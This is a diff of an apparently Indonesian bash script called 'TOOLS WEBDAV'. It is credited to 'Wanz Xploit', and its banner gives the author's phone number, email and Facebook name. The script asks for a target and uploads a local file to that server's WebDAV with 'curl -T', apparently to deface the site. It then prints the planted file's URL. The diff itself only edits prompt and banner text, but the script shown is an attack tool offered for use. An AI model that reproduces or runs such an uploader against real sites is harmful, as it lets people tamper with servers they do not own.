@@ -8,8 +8,8 @@ echo " /                    /""|" " contacts:0881037302039"
 echo "/____________________/"" |" " ========================"
 echo "|""Author: Wanz Xploit" "|" "|" " Me:venomreyy@gmail.com"
 echo "|====================|"" |" " ========================"
-echo "|""DRAGONS HUNTER""|"" |" " FB: Redi Awan "
-echo "|________| °| °|_______|""/" "  ========================"
+echo "|""DRAGONS HUNTER""|"" |" "        FB: Redi Awan "
+echo "|________| °| °|_______|""/" " ========================"
 echo ""
 echo "              [""-""]""TOOLS WEBDAV""[""-""]"
 echo ""
@@ -38,7 +38,7 @@ echo "[""1""]" "Masukan Target";
 echo ""
 read -p "wanzxploit@root# " pil;
 case $pil in
-1)echo -n "Target Webdav:" 
+1)echo -n "Masukan Target:" 
 read tg
 echo ""
 echo -n "Target $tg !" "Tekan Enter Untuk Tusbol.."
@@ -47,7 +47,7 @@ curl -T /sdcard/$sc $tg
 echo ""
 echo ""
 echo "======================================================================"
-echo "Silakan Di Cek dan pastikan link nya (.com/index.html) bukan (.com//index.html: $tg/$sc"
+echo "Silakan Di Cek: $tg/$sc"
 echo "======================================================================"
 exit
 ;;
